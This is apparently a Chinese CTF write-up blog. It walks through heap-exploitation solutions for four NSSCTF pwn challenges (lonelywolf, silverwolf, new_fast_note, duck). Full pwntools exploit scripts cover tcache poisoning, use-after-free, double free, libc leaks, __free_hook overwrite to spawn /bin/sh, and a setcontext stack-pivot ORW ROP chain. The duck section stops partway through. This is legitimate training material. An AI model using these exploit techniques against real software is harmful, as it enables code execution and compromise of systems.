# 1. [CISCN 2021 初赛]lonelywolf

题目地址：[[CISCN 2021 初赛\]lonelywolf | NSSCTF](https://www.nssctf.cn/problem/856)

### 思路： 

1. 修开tcache结构，伪造一个0x91的chunk，伪造0x91chunk的数量（填满tcache），再将其释放free进入unsortedbin来泄漏main_arena地址。

   ![image-20240712160527756](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121605340.png)

### 题目分析：

1. 只能控制一个堆index只能位0，add函数，限制了**不能申请大小为0x90**的chunk：

   ![image-20240712174415106](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121744178.png)

2. delete函数，heap指针没有清0，存在double free：

   ![image-20240712174547228](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121745266.png)

3. edit函数，结合free函数，存在UAF漏洞，释放chunk后还能往里面写参数（可以修改next的值）：

   ![image-20240712174638950](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121746989.png)

4. show函数，同样存在UAF漏洞，可以打印释放后的chunk中的内容：

   ![image-20240712174751510](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121747554.png)

### 利用：

1. 先申请一个大小为0x80的chunk，再double free泄漏tcache的基地址：

   ```python
   # 泄漏tcache的基地址
   add(0x78)
   free()
   edit(p64(0)*2)	#绕过double free的检查
   free()
   show()
   
   p.recvuntil(b"Content: ")
   tcache = (u64(p.recv(6).ljust(8,b'\x00'))&0xfffffffff000)
   success("tcache==>"+hex(tcache))
   ```

   ![image-20240712175402058](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121754372.png)

2. 修改chunk0x80的next指针，指向tcache+0x10的位置，然后两个申请得到tcache chunk0x251：

   ```python
   # 修改tcachebin的next指针，指向tcache的基地址+0x10
   payload = p64(tcache+0x10)
   edit(payload)
   
   add(0x78) 
   add(0x78)   #申请得到tcache
   ```

   ![image-20240712175720770](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121757909.png)

3. 伪造0x90chunk的数量，伪造0x80chunk的next地址指向tcache+0x260（后续用来伪装成0x90chunk），伪造0x70的next地址指向tcache+0x250（0x80的上面）（后续用来更改0x80chunk的size字段值）：

   ```python
   payload = b"\x00"*0x5+b'\x01'+b'\x01'+b"\x08"+p64(0)*(7+4)+p64(tcache+0x250)*2+p64(tcache+0x260)
   edit(payload)
   ```

   ![image-20240712180651608](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121806904.png)

4. 修改上面0x80chunk的**size字段为0x91**（伪造0x90大小的chunk），再申请一个小chunk将伪造的0x90chunk与topchunk**隔开**：

   ```python
   add(0x68)   #0x70 修改0x80chunk的size字段
   payload = p64(0)+p64(0x91)+p64(0)
   edit(payload)
   add(0x38)   #将伪造的0x90chunk与TOP隔开
   edit(b'\x00'*0x8+p64(0x31)) #由于前面申请的0x40chunk会在伪造的0x90chunk的数据域内部，所以在后面额外加上0x41的数据域大小
   ```

   不加 edit(b'\x00'*0x8+p64(0x31))：（必须是0x40+0x30或者0x30+0x20，不然会报错）

   ![image-20240712181413019](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121814170.png)

   加上 edit(b'\x00'*0x8+p64(0x31))：

   ![image-20240712181629240](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121816461.png)

5. 申请0x80chunk（实际上申请的时0x90chunk），然后释放活得main_arena中的地址：

   ```python
   add(0x78)   #表面上申请0x80chunk，实际上申请的时0x90chunk
   free()
   show()
   
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
   ```

   ![image-20240712182011615](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121820931.png)

6. 再申请0x40的chunk，释放后修改其next指针指向**__free_hook-0x8**地址（因为tcache在申请时不检查size字段，所以不用看__free_hook-0x8前面的size字段值）：

   ```python
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   
   add(0x28)
   free()
   payload = p64(free_hook_addr-8)
   edit(payload)
   ```

   ![image-20240712182813509](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121828787.png)

7. 两次申请后得到该地址，再向该地址写入 b"/bin/sh\x00"+p64(system_addr)，最后free执行system("/bi/sh")：

   ```python
   add(0x28)
   add(0x28)
   payload = b'/bin/sh\x00'+p64(system_addr)
   edit(payload)
   free()
   ```

8. 完整EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   
   context(os='linux', arch='amd64', log_level='debug')
   
   # p = remote("node4.anna.nssctf.cn",28516)
   p = process("./pwn")
   libc = ELF('/home/kali/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
   elf = ELF("./pwn")
   
   n2b = lambda x    : str(x).encode()
   rv  = lambda x    : p.recv(x)
   ru  = lambda s    : p.recvuntil(s)
   sd  = lambda s    : p.send(s)
   sl  = lambda s    : p.sendline(s)
   sn  = lambda s    : sl(n2b(n))
   sa  = lambda t, s : p.sendafter(t, s)
   sla = lambda t, s : p.sendlineafter(t, s)
   sna = lambda t, n : sla(t, n2b(n))
   ia  = lambda      : p.interactive()
   rop = lambda r    : flat([p64(x) for x in r])
   
   
   def add(size):
       sla(b'choice:',b'1')
       sla(b':',str(0))
       sla(b':',str(size))
   
   def edit(content):
       sla(b':',b'2')
       sla(b':',b'0')
       sla(b':',content)
   
   def show():
       p.sendlineafter(b':',b'3')
       p.sendlineafter(b':',b"0")
   
   def free():
       sla(b': ',b'4')
       sla(b': ',b'0')
   
   # 泄漏tcache的基地址
   add(0x78)
   free()
   edit(p64(0)*2)
   free()
   show()
   
   p.recvuntil(b"Content: ")
   tcache = (u64(p.recv(6).ljust(8,b'\x00'))&0xfffffffff000)
   success("tcache==>"+hex(tcache))
   
   # 修改tcachebin的next指针，指向tcache的基地址+0x10
   payload = p64(tcache+0x10)
   edit(payload)
   
   add(0x78) 
   add(0x78)   #申请得到tcache
   
   payload = b"\x00"*0x5+b'\x01'+b'\x01'+b"\x08"+p64(0)*(7+4)+p64(tcache+0x250)*2+p64(tcache+0x260)
   edit(payload)
   
   add(0x68)   #0x70 修改0x80chunk的size字段
   payload = p64(0)+p64(0x91)+p64(0)
   edit(payload)
   
   add(0x38)   #将伪造的0x90chunk与TOP隔开
   edit(b'\x00'*0x8+p64(0x41))
   add(0x78)   #表面上申请0x80chunk，实际上申请的时0x90chunk
   
   free()
   show()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
   
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   
   add(0x38)
   free()
   payload = p64(free_hook_addr-8)
   edit(payload)
   
   add(0x38)
   add(0x38)
   payload = b'/bin/sh\x00'+p64(system_addr)
   edit(payload)
   
   free()
   p.sendline(b"cat flag")
   p.interactive()
   ```

   

   成功拿到本地flag：

   ![image-20240712183148198](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407121831277.png)

# 2. [CISCN 2021 初赛]silverwolf

题目地址：[[CISCN 2021 初赛\]silverwolf | NSSCTF](https://www.nssctf.cn/problem/912)

相比于上一道题，这道题开了sanbox，不能直接使用system，需要在**堆上构造ORW**去读取flag。

### 思路：

1. 利用UAF泄漏堆的基地址、泄漏libc：修改next，申请到tcache作为chunk，修改tcache struct，伪造bin的数量，利用unsortedbin泄漏libc。
2. 再次利用UAF申请到tcache，修改tcache伪造堆的结构，便于后面写ORW。
3. 将ORW写入到构造的堆上，free_hook覆盖为setcontext+53（利用mov     rsp, [rdi+0A0h]指令，指令完成栈迁移），最后free完成栈迁移，迁移到写入ORW的堆上，输出flag。

### 分析：

1. 函数都和上一题一样，seccomp限制了一些函数调用，用seccomp-tools工具查出，只能使用open，read，write三个，典型的ORW来读取、输出flag：

   ![image-20240723173957484](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232233996.png)

   ![image-20240723174037984](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231742013.png)

### 利用：

1. 由于调用seccomp函数，程序会产生一些无用的bin，先将其申请掉，便于后面构造：

   ```python
   for i in range(7):
       add(0x78)
       edit(b"a")
   for i in range(7+4):
       add(0x68)
       edit(b"a")
   for i in range(7+5):
       add(0x18)
       edit(b"a")
   ```

   ![image-20240723174601470](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231746624.png)

   ![image-20240723174636358](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231746469.png)

1. 先泄漏出堆的基地址，再利用基地址修改next指针：

   ```python
   # 泄漏堆地址
   add(0x78)
   free()
   edit(p64(0)*2)
   free()
   show()
   p.recvuntil(b"Content: ")
   heap_addr = (u64(p.recv(6)[-6:].ljust(8,b'\x00'))&0xfffffffff000)-0x1000	#堆申请好后，偏移都是固定的，gdb调试出偏移即可
   success("heap_addr==>"+hex(heap_addr))
   edit(p64(heap_addr+0x10))   #修改next指针，指向tcache
   ```

   ![image-20240723175002268](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231750509.png)

2. 修改tcache，伪造0x90bin的数量，并利用0x80bin和0x70bin来达到释放0x90chunk的目的（伪造size字段）：

   ```python
   # 申请到tcache ，伪造tcache头，泄漏libc基地址
   change_size_addr = heap_addr+0x250
   free_chunk_addr  = heap_addr+0x260
   add(0x78)
   add(0x78)   #tcache chunk
   payload = b"\x00"*5 + b"\x02" + b"\x01" + b"\x07" + p64(0)*12 + p64(change_size_addr) + p64(free_chunk_addr)
   edit(payload)
   
   add(0x68)   #修改size大小
   edit(p64(0)+p64(0x91))
   
   add(0x28)
   edit(p64(0)+p64(0x21))  #保证寻址到topchunk
   add(0x78)   #释放0x91chunk
   free()
   show()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
    
   #计算__free_hook和system地址
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   setcontext_addr = libc_base + libc.sym["setcontext"] + 53
   success("free_hook_addr==>"+hex(free_hook_addr))
   success("setcontext_addr==>"+hex(setcontext_addr))
   ```

   ![image-20240723175357154](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231753374.png)

   ![image-20240723175528718](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231755919.png)

   ![image-20240723175649712](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231756907.png)

3. 再次利用UAF修改next，申请到tcache，伪造tcache来构造堆，为写入ORW做准备：

   ```python
   add(0x78)
   free()
   free()
   edit(p64(heap_addr+0x10))   #后续申请到tcache
   add(0x78)
   add(0x78)
   # 准备堆
   payload = b"\x02"*0x40		#bin的数量全部给2个，简单高效
   payload += p64(free_hook_addr) + p64(0)     #chunk20,用来修改free_hook chunk30没用
   #后面bin的地址随便选，保证未被使用即可，且chunk50与chunk60之间的偏移必须是0xa0、chunk70和chunk80之间的偏移必须是0x60
   payload += p64(heap_addr+0x1000)            #chunk40 存放flag名字
   payload += p64(heap_addr+0x2000)            #chunk50 作为free的chunk,0x2000+0xa0刚好寻址到下一个chunk中存放的地址
   payload += p64(heap_addr+0x2000+0xa0)       #chunk60 存放栈迁移后的地址
   payload += p64(heap_addr+0x3000)            #chunk70 ORW1
   payload += p64(heap_addr+0x3000+0x60)       #chunk80 ORW2,衔接上一个继续写，不能将chunk头空出来
   edit(payload)
   ```

   setcontext中利用的栈迁移指令，和leave；ret指令不一样（需要rbp寄存器中转一下），迁移的地址可以用rdi+0xa0寻址找到：

   ![image-20240723214730798](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232147972.png)

   当free掉chunk50时，chunk50的地址**heap_addr+0x2000** (没有chunk头，**free时的地址直接是data域**)会给到rdi寄存器，此时free_hook会跳转到setcontext+53 ==> 利用**rdi+0xa0寻址**，取出该地址处(heap_addr+0x2000+0xa0)的值给rsp寄存器，作为新的栈，**最后执行ret**就会直接从该栈地址处再取出指令的地址执行，即取出我们构造的ORW指令的地址：

   ![image-20240723213418154](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232134422.png)

   ![image-20240723215208111](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232152365.png)

   ![image-20240723180958552](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231809747.png)

4. 准备ORW并写入到堆上：

   ```python
   # 准备ORW
   pop_rdi=libc_base+0x00000000000215bf
   pop_rdx=libc_base+0x0000000000001b96
   pop_rax=libc_base+0x0000000000043ae8
   pop_rsi=libc_base+0x0000000000023eea
   ret=libc_base+0x8aa
   open=libc.sym['open']+libc_base
   read=libc.sym['read']+libc_base
   write=libc.sym['write']+libc_base    
   # syscall = read_addr+15
   syscall = write_addr+18
   flag=heap_addr+0x1000   
   setcontext=libc.sym['setcontext']+libc_base+53  #prepare
   
   #open(0,flag) (open will delete environment)
   orw =p64(pop_rdi)+p64(flag)
   orw+=p64(pop_rsi)+p64(0)
   orw+=p64(pop_rax)+p64(2)	#传递open函数的系统编号
   orw+=p64(syscall)     #不能直接调用open函数，用 syscall
   
   #read(3,heap+0x1010,0x30) 
   orw+=p64(pop_rdi)+p64(3)
   orw+=p64(pop_rsi)+p64(heap_addr+0x1010)#存放读取的flag
   orw+=p64(pop_rdx)+p64(0x30)
   orw+=p64(read)     
   
   #write(1,heap+0x1010,0x30)
   orw+=p64(pop_rdi)+p64(1)
   orw+=p64(pop_rsi)+p64(heap_addr+0x1010)#输出读取的flag地址
   orw+=p64(pop_rdx)+p64(0x30)
   orw+=p64(write)
   
   # 向堆上写入ORW
   add(0x38)
   edit(b"./flag\x00\x00")   #写入flag
   
   #堆上写入栈迁移的地址heap_addr+0x3000，迁移完成后在这里执行写好的指令
   add(0x58)
   edit(p64(heap_addr+0x3000)+p64(ret)) #加ret时为例平衡setcontext中的push指令
   
   #分两次向堆写入ORW
   add(0x68)
   edit(orw[:0x60])
   add(0x78)
   edit(orw[0x60:])
   
   #修改free_hook指向setcontext+53
   add(0x18)
   edit(p64(setcontext_addr))
   ```

   open函数直接使用**syscall执行**：

   ![image-20240723215748976](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232234166.png)

   ![image-20240723220126454](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232201696.png)

   ![image-20240723184652834](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231846079.png)

5. 触发ORW，获取flag：

   ```python
   #触发ORW
   add(0x48)
   free()
   p.interactive()
   ```

   ![image-20240723185011405](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231850509.png)

   

   完成EXP：

   ```python
   from pwn import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   # p = remote("node4.anna.nssctf.cn",28809)
   p = process("./silverwolf")
   # p = gdb.debug("./pwn")
   libc = ELF('./libc-2.27.so')
   elf = ELF("./pwn")
   
   def add(size):
       p.sendlineafter(b'Your choice: ',b'1')
       p.sendlineafter(b'Index: ',str(0))
       p.sendlineafter(b':',str(size))
   
   def edit(content):
       p.sendlineafter(b'Your choice: ',b'2')
       p.sendlineafter(b'Index: ',b'0')
       p.sendlineafter(b':',content)
   
   def show():
       p.sendlineafter(b'Your choice: ',b'3')
       p.sendlineafter(b'Index: ',b"0")
   
   def free():
       p.sendlineafter(b'Your choice: ',b'4')
       p.sendlineafter(b'Index: ',b'0')
   
   for i in range(7):
       add(0x78)
       edit(b"a")
   for i in range(7+4):
       add(0x68)
       edit(b"a")
   for i in range(7+5):
       add(0x18)
       edit(b"a")
   
   # 泄漏堆地址
   add(0x78)
   free()
   edit(p64(0)*2)
   free()
   show()
   p.recvuntil(b"Content: ")
   heap_addr = (u64(p.recv(6)[-6:].ljust(8,b'\x00'))&0xfffffffff000)-0x1000
   success("heap_addr==>"+hex(heap_addr))
   edit(p64(heap_addr+0x10))   #修改next指针，指向tcache
   
   # 申请到tcache ，伪造tcache头，泄漏libc基地址
   change_size_addr = heap_addr+0x250
   free_chunk_addr  = heap_addr+0x260
   add(0x78)
   add(0x78)   #tcache chunk
   payload = b"\x00"*5 + b"\x02" + b"\x01" + b"\x07" + p64(0)*12 + p64(change_size_addr) + p64(free_chunk_addr)
   edit(payload)
   
   add(0x68)   #修改size大小
   edit(p64(0)+p64(0x91))
   
   add(0x28)
   edit(p64(0)+p64(0x21))  #保证寻址到topchunk
   add(0x78)   #释放0x91chunk
   free()
   show()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
    
   #计算__free_hook和system地址
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   setcontext_addr = libc_base + libc.sym["setcontext"] + 53
   success("free_hook_addr==>"+hex(free_hook_addr))
   success("setcontext_addr==>"+hex(setcontext_addr))
   
   
   # # 堆上的ORW，利用setcontext来构造ORW 
   #继续申请tcache作为chunk
   add(0x68)
   free()
   edit(p64(0)*2)
   free()
   edit(p64(heap_addr+0x80))   #后续申请到tcache
   add(0x68)
   add(0x68)   
   edit(p64(0))
   
   add(0x78)
   free()
   edit(p64(0)*2)
   free()
   edit(p64(heap_addr+0x10))   #后续申请到tcache
   add(0x78)
   add(0x78) 
   
   # 准备堆
   payload = b"\x02"*0x40
   payload += p64(free_hook_addr) + p64(0)     #chunk20,用来修改free_hook chunk30没用
   payload += p64(heap_addr+0x1000)            #chunk40 存放flag名字
   payload += p64(heap_addr+0x2000)            #chunk50 作为free的chunk,0x2000+0xa0刚好寻址到下一个chunk中存放的地址
   payload += p64(heap_addr+0x2000+0xa0)       #chunk60 存放栈迁移后的地址
   payload += p64(heap_addr+0x3000)            #chunk70 ORW1
   payload += p64(heap_addr+0x3000+0x60)       #chunk80 ORW2,衔接上一个继续写，不能将chunk头空出来
   edit(payload)
   
   # 准备ORW
   pop_rdi=libc_base+0x00000000000215bf
   pop_rdx=libc_base+0x0000000000001b96
   pop_rax=libc_base+0x0000000000043ae8
   pop_rsi=libc_base+0x0000000000023eea
   ret=libc_base+0x8aa
   open=libc.sym['open']+libc_base
   read=libc.sym['read']+libc_base
   write=libc.sym['write']+libc_base    
   syscall=read+15
   flag=heap_addr+0x1000   
   setcontext=libc.sym['setcontext']+libc_base+53  #prepare
   
   #open(0,flag) (open will delete environment)
   orw =p64(pop_rdi)+p64(flag)
   orw+=p64(pop_rsi)+p64(0)
   orw+=p64(pop_rax)+p64(2)
   orw+=p64(syscall)      
   
   #read(3,heap+0x1010,0x30) 
   orw+=p64(pop_rdi)+p64(3)
   orw+=p64(pop_rsi)+p64(heap_addr+0x1010)
   orw+=p64(pop_rdx)+p64(0x30)
   orw+=p64(read)     
   
   # #write(1,heap+0x1010,0x30)
   orw+=p64(pop_rdi)+p64(1)
   orw+=p64(pop_rsi)+p64(heap_addr+0x1010)#存放地址0x50
   orw+=p64(pop_rdx)+p64(0x30)
   orw+=p64(write)
   
   # 向堆上写入ORW
   add(0x38)
   edit(b"./flag\x00\x00")   #写入flag
   
   #写入堆上ORW的地址
   add(0x58)
   edit(p64(heap_addr+0x3000)+p64(ret)) #加ret时为例平衡setcontext中的push指令
   
   #分两次向堆写入ORW
   add(0x68)
   edit(orw[:0x60])
   add(0x78)
   edit(orw[0x60:])
   
   #修改free_hook
   add(0x18)
   edit(p64(setcontext_addr))
   
   success("heap_addr==>"+hex(heap_addr))
   debug()
   #触发ORW
   add(0x48)
   free()
   p.interactive()
   
   ```

   ![image-20240723185022572](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407231850075.png)

   

6. 如果不用syscall调用open，而是直接用open函数的地址会发生什么？发现执行到sys_openat直接报错退出

   ![image-20240723221841038](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232218259.png)

   但是在这里 **将rax强制设置为2** 后就能正常执行了，所以是前面程序中的**seccomp将openat搬掉了** （或者说只允许系统调用0-read、1-write、2-open通过），直接查出来的open函数不能用，需要额外用系统调用编号2来调用：

   ![image-20240723222956731](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232229845.png)

   ![image-20240723222356807](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232223046.png)

   查系统调用的而网址：

   [syscalls.w3challs.com](https://syscalls.w3challs.com/)

   ![image-20240723222554594](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232226155.png)

   ![image-20240723222654608](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232226755.png)

# 3. [HGAME 2023 week2]new_fast_note

题目地址：[[HGAME 2023 week2\]new_fast_note | NSSCTF](https://www.nssctf.cn/problem/3506)

### 思路：

1. 0x90chunk填满tcache后，再申请一个0x90chunk（进入unsortedbin），结合UAF获取main_arena中的地址==>进而获取libc地址。

2. 用0x40chunk填满tcache后，再申请一个0x40的chunk（进入Fastbin），利用fastbin的double free来实现任意地址分配chunk（即任意地址写）。

3. 因为题目没有edit，所以**不能通过覆盖key字段**（覆盖key为0），来实现tcache上的多次释放，只能通过填满tcache后才能free到fast bin或是unsorted bin。

4. key字段如下：

   ![image-20240712221904850](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407122219079.png)

### 分析：

1. 只给了add、show、delete三个函数，没有编辑，所以泄漏基地址后，利用fastbin进行double free。先看add函数：

   heap个数不能超过 20，大小不能超过0xff（直接用0x90的chunk填满tcache后进入unsortedbin拿到mani_arena中的地址）。

   ![image-20240713123828723](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131238813.png)

2. delete函数，heap指针未清零，存在UAF漏洞：

   ![image-20240713123958476](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131239538.png)

3. 结合delete函数，明显存在UAF漏洞，拿到main_arena中的地址后，可以直接输出：

   ![image-20240713124100793](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131241859.png)

### 利用：

1. 先用0x90chunk填满tcache，再多申请一个0x90chunk，释放后进入unsortedbin，拿到main_arena中的地址，进而计算出基地址：

   ```python
   # 溢出进unsortedbin
   for i in range(8):
       add(0x80,i,b'a')
   for i in range(7):
       free(i)
   #隔开TOP chunk
   add(0x38,8,b'a')
   free(7)
   show(7)
   #泄漏main_arena中的地址
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
   
   #计算__free_hook和system地址
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   ```

   ![image-20240713124652422](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131246642.png)

2. 然后，利用0x40chunk填满tcache后，进入fastbin进行double free，实现任意地址分配chunk：

   ```python
   # 溢出进unsortedbin
   for i in range(10):
       add(0x38,i,b'a')
   for i in range(9):
       free(i)
   # free(8)
   free(9)
   free(8)
   #在free_hook_addr-0x8处分配chunk
   payload = p64(free_hook_addr-0x8)
   for i in range(7):
       add(0x38,i,b'a')
   add(0x38,8,payload)
   ```

   ![image-20240713125228682](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131252839.png)

3. 两次申请得到该chunk，后向其写入"/bin/sh"并用system地址覆盖__free_hook，最后free掉该chunk即可拿到shell：

   ```python
   add(0x38,0,b'a')
   add(0x38,0,b'a')
   
   payload = b"/bin/sh\x00"+p64(system_addr)
   add(0x38,0,payload)
   free(0)
   p.sendline(b'cat flag')
   ```

4. 完整EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   # p = remote("node5.anna.nssctf.cn",22756)
   p = process("./pwn")
   libc = ELF('/home/kali/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so')
   def add(size,index,context):
       p.sendlineafter(b'>',b'1')
       p.sendlineafter(b':',str(index).encode())
       p.sendlineafter(b':',str(size).encode())
       p.sendlineafter(b':',context)
   
   def free(index):
       p.sendlineafter(b'>',b'2')
       p.sendlineafter(b':',str(index).encode())
   
   def show(index):
       p.sendlineafter(b'>',b'3')
       p.sendlineafter(b':',str(index).encode())
   
   # 溢出进unsortedbin
   for i in range(8):
       add(0x80,i,b'a')
   for i in range(7):
       free(i)
   add(0x38,8,b'a')
   free(7)
   show(7)
   #泄漏main_arena中的地址
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
   
   #计算__free_hook和system地址
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   
   
   # 溢出进unsortedbin
   for i in range(10):
       add(0x38,i,b'a')
   for i in range(9):
       free(i)
   # free(8)
   free(9)
   free(8)
   #在free_hook_addr-0x8处分配chunk
   payload = p64(free_hook_addr-0x8)
   for i in range(7):
       add(0x38,i,b'a')
   add(0x38,8,payload)
   
   add(0x38,0,b'a')
   add(0x38,0,b'a')
   
   payload = b"/bin/sh\x00"+p64(system_addr)
   add(0x38,0,payload)
   free(0)
   p.sendline(b'cat flag')
   p.interactive()
   ```

   

   ![image-20240713125605048](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131256416.png)





# 4. [[CISCN 2022 华东北\]duck | NSSCTF](https://www.nssctf.cn/problem/2388)

### 思路：高版本glibc，tcache回堆next指针加密

1. tcache加密：(当前next指针地址>>>12)^(要指向的下一个chunk地址) ， 第一个进入tcache的**chunk下一个chunk地址**为0。（注意进入tcache时链表采用的是**头插法**）
2. 利用UAF泄漏libc基地址，由于**glibc2.34**中取消了 **maloc_hook** 和 **free_hook** ,这两个符号。
3. 所以只能采用 **泄漏environ中存储的栈地址** ，然后**任意分配chunk到栈上**，构造ROP链，覆盖栈上的返回值。

### 分析：

1. 题目给的libc版本是glibc-2.34，add函数添加指定大小的chunk0x110：

   ![image-20240715210018852](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152100935.png)

   ![image-20240715210112736](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152101147.png)

2. delete函数中，堆指针没有清0，所以存在UAF漏洞：

   ![image-20240715210217871](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152102956.png)

3. show函数，和edit函数结合delete函数，存在UAF利用：

   ![image-20240715210305328](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152103410.png)

   ![image-20240715210326138](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152103234.png)

4. 可以看到漏洞给到额很明显，程序开了PIE保护，且**无法泄漏程序**的基地址，只能在**泄漏libc基地址**上下功夫，通过填满tcache，将chunk放入unsortedbin获取main_arena地址，进而获取libc基地址：

   ![image-20240715210423867](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152104981.png)

### 利用：

1. 先填满tcache，利用UAF获取main_arena地址，计算出后续要使用的地址：

   * 由于glibc-2.34中没有 **maloc_hook** 和 **free_hook** 这两个符号，所以考虑泄漏environ上的栈地址，进而覆盖返回值挟持程序流程。
   * 由于程序加载的基地址无法得到，所以ROPgadget在程序中查普通的ROP不起作用，只能在泄漏完libc基地址后，**在libc中search查找能拼凑的pop_rdi_ret片段地址**。
   * system的地址和str_bin_sh是ROP链必须的。

   ```python
   # 溢出进unsortedbin,多申请一个,防止释放的chunk合并到TOP chunk
   for i in range(9):
       add()
   for i in range(7):
       free(i)
   # debug()
   #泄漏libc基地址
   free(7)
   show(7)
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = 0x1F2C60
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
    
   #计算pop_rdi_ret、system、bin_sh地址
   system_addr = libc_base+libc.sym["system"]
   sh_addr = libc_base + next(libc.search(b"/bin/sh"))
   environ_addr = libc_base+libc.sym["environ"]
   pop_rdi_ret = libc_base + next(libc.search(asm('pop rdi;ret;')))
   success("system_addr==>"+hex(system_addr))
   success("environ_addr==>"+hex(environ_addr))
   success("bin_sh_addr==>"+hex(sh_addr))
   success("pop_rdi_ret==>"+hex(pop_rdi_ret))
   ```

